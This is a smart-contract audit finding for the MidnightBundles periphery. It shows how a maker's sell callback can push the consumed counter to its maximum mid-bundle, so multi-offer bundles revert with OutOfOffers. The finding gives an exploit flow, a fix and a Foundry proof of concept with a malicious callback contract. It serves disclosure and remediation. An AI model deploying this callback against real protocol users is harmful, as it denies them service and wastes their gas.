### Title
Maker callback can advance `consumed[maker][group]` mid-bundle, zeroing `consumableUnits` for subsequent same-group offers and reverting with `OutOfOffers` - (File: src/periphery/MidnightBundles.sol / src/periphery/ConsumableUnitsLib.sol)

### Summary
`ConsumableUnitsLib.consumableUnits` reads live on-chain `consumed[maker][group]` state on every bundle loop iteration. Because `Midnight.take` invokes `offer.callback` (the maker's own sell callback) **after** the consumed counter has already been incremented and the cap check has already passed, a malicious maker can call `setConsumed(group, type(uint256).max, maker)` inside that callback. Every subsequent `consumableUnits` call for any other offer sharing the same `(maker, group)` pair then returns 0, causing `unitsToTake = 0` for all remaining offers and the bundle to revert with `OutOfOffers`.

### Finding Description

**Code path:**

`buyWithUnitsTargetAndWithdrawCollateral` (MidnightBundles.sol:71–88) iterates over `takes[]`. For each offer it calls:

```
unitsToTake = min(
    targetUnits - filledUnits,
    takes[i].units,
    ConsumableUnitsLib.consumableUnits(MIDNIGHT, id, takes[i].offer)  // line 77
);
```

`consumableUnits` (ConsumableUnitsLib.sol:15–17) reads live storage:

```solidity
uint256 consumed = IMidnight(midnight).consumed(offer.maker, offer.group);
return offer.maxUnits.zeroFloorSub(consumed);
```

Inside `Midnight.take` (Midnight.sol:366–373), the consumed counter is incremented and the cap is checked **before** any callback fires:

```solidity
newConsumed = consumed[offer.maker][offer.group] += units;
require(newConsumed <= offer.maxUnits, ConsumedUnits());   // passes here
```

Then, for a sell offer (`offer.buy = false`), the maker's own callback is resolved at line 421:

```solidity
address sellerCallback = offer.buy ? takerCallback : offer.callback;
```

and invoked at lines 458–473. The bundle always passes `takerCallback = address(0)` (line 80), so `sellerCallback = offer.callback` — the maker's field — regardless of what the bundle passes.

`setConsumed` (Midnight.sol:723–728) has no reentrancy guard and is callable by anyone authorized for `onBehalf`:

```solidity
function setConsumed(bytes32 group, uint256 amount, address onBehalf) external {
    require(onBehalf == msg.sender || isAuthorized[onBehalf][msg.sender], Unauthorized());
    require(amount >= consumed[onBehalf][group], AlreadyConsumed());
    consumed[onBehalf][group] = amount;
}
```

**Attacker-controlled inputs:**
- `offer.callback` — set by the maker in the offer struct
- `isAuthorized[maker][callbackContract]` — set by the maker via `setIsAuthorized` before the bundle executes (or the callback contract IS the maker)

**Exploit flow (concrete):**

1. Maker creates two sell offers in the same group, each `maxUnits = 100`. Sets `offer.callback = MaliciousCallback` and calls `midnight.setIsAuthorized(MaliciousCallback, true, maker)`.
2. Taker calls `buyWithUnitsTargetAndWithdrawCollateral(targetUnits=200, ..., [offer0, offer1], ...)`.
3. **Iteration i=0**: `consumableUnits(offer0)` reads `consumed=0`, returns 100. `unitsToTake=100`. `take` increments `consumed` to 100, cap check passes. `MaliciousCallback.onSell` calls `midnight.setConsumed(group, type(uint256).max, maker)` → `consumed[maker][group] = type(uint256).max`. `take` returns successfully. `filledUnits = 100`.
4. **Iteration i=1**: `consumableUnits(offer1)` reads `consumed = type(uint256).max`, returns `zeroFloorSub(100, type(uint256).max) = 0`. `unitsToTake = 0`. `take` with 0 units is a no-op. `filledUnits` stays at 100.
5. Loop ends. `require(filledUnits == targetUnits)` → `100 == 200` → **reverts `OutOfOffers`**.

**Why existing checks fail:**
- The `try/catch` on line 79–85 only catches reverts from `take` itself; it does not prevent the callback from mutating state that affects the next loop iteration.
- The consumed cap check in `take` (line 372) fires before the callback, so the first take succeeds and the mutation is invisible to `take`'s own invariants.
- The Certora `consumeNonDecreasing` rule is satisfied (consumed only increases), so formal verification does not catch this cross-call interference.
- There is no snapshot or lock of `consumed` state at bundle entry.

### Impact Explanation
Any bundle function that uses `ConsumableUnitsLib.consumableUnits` in a multi-offer loop (`buyWithUnitsTargetAndWithdrawCollateral`, `supplyCollateralAndSellWithUnitsTarget`, and the assets-target variants) can be griefed by a maker who controls `offer.callback`. The taker's transaction reverts with `OutOfOffers` after partial state has been computed (though all state reverts with the transaction). The taker wastes gas and cannot complete the intended fill. The maker can repeat this indefinitely against any taker who includes their offers in a bundle, constituting a persistent bundle DoS.

### Likelihood Explanation
**Preconditions:**
1. Maker sets `offer.callback` to a contract that calls `setConsumed(group, type(uint256).max, maker)` in `onSell` (or `onBuy` for buy offers).
2. Maker pre-authorizes the callback contract via `setIsAuthorized`, or the callback contract address equals the maker address.
3. A taker includes at least two offers from the same `(maker, group)` pair in a bundle with `targetUnits` exceeding the first offer's remaining capacity.

All three preconditions are fully attacker-controlled and require no privileged access, no oracle manipulation, and no user mistake. The attack is repeatable at zero cost beyond gas.

### Recommendation
Snapshot `consumed[maker][group]` for each offer **before** the `take` call and use the snapshot — not a fresh `consumableUnits` read — to credit `filledUnits`. Alternatively, compute `unitsToTake` from the snapshot and assert post-take that `consumed` increased by exactly `unitsToTake` (reverting or skipping if it did not). A simpler mitigation is to record `consumed` before each `take` call and use `consumed_after - consumed_before` as the actual fill amount rather than trusting the pre-computed `unitsToTake`.

### Proof of Concept

```solidity
// SPDX-License-Identifier: GPL-2.0-or-later
pragma solidity 0.8.34;

import "forge-std/Test.sol";
import {MidnightBundles, Take, CollateralWithdrawal, TokenPermit, PermitKind} from "src/periphery/MidnightBundles.sol";
import {IMidnight, Offer} from "src/interfaces/IMidnight.sol";
import {ISellCallback} from "src/interfaces/ICallbacks.sol";

contract MaliciousSellerCallback is ISellCallback {
    IMidnight public midnight;
    bytes32 public group;
    address public maker;

    constructor(address _midnight, bytes32 _group, address _maker) {
        midnight = IMidnight(_midnight);
        group = _group;
        maker = _maker;
    }

    function onSell(bytes32, /*id*/ IMidnight.Market memory, uint256, uint256, uint128, address, address, bytes memory)
        external
        returns (bytes4)
    {
        // Advance consumed to max, zeroing consumableUnits for all remaining same-group offers
        midnight.setConsumed(group, type(uint256).max, maker);
        return ISellCallback.onSell.selector; // CALLBACK_SUCCESS
    }
}

contract BundleGriefTest is Test {
    // Setup: two sell offers from same maker, same group, maxUnits=100 each
    // targetUnits = 200
    // Expected: bundle reverts with OutOfOffers after first offer fills 100 units
    function testMakerCallbackGriefBundle() public {
        // ... standard MidnightBundles test setup ...

        MaliciousSellerCallback cb = new MaliciousSellerCallback(address(midnight), group, maker);
        vm.prank(maker);
        midnight.setIsAuthorized(address(cb), true, maker);

        offer0.callback = address(cb);
        offer1.callback = address(cb); // same group

        Take[] memory takes = new Take[](2);
        takes[0] = Take({offer: offer0, units: 100, ratifierData: hex""});
        takes[1] = Take({offer: offer1, units: 100, ratifierData: hex""});

        vm.prank(taker);
        vm.expectRevert(IMidnightBundles.OutOfOffers.selector);
        midnightBundles.buyWithUnitsTargetAndWithdrawCollateral(
            200, maxBuyerAssets, taker, _noPermit(), takes, new CollateralWithdrawal[](0), address(0), 0, address(0)
        );

        // Assert: only 100 units would have been filled (first offer), not 200
        // filledUnits == 100, targetUnits == 200 → revert confirmed
        // consumed[maker][group] == type(uint256).max after callback
        assertEq(midnight.consumed(maker, group), 0); // all state reverted with the tx
    }
}
```

**Key assertions:**
- `vm.expectRevert(IMidnightBundles.OutOfOffers.selector)` — bundle reverts despite sufficient offer capacity existing at bundle entry.
- After the revert, `consumed[maker][group] == 0` — confirming all state rolled back, but the taker's gas is lost and the operation failed.
- Removing `offer.callback` (setting it to `address(0)`) makes the same bundle succeed — confirming the callback is the sole cause.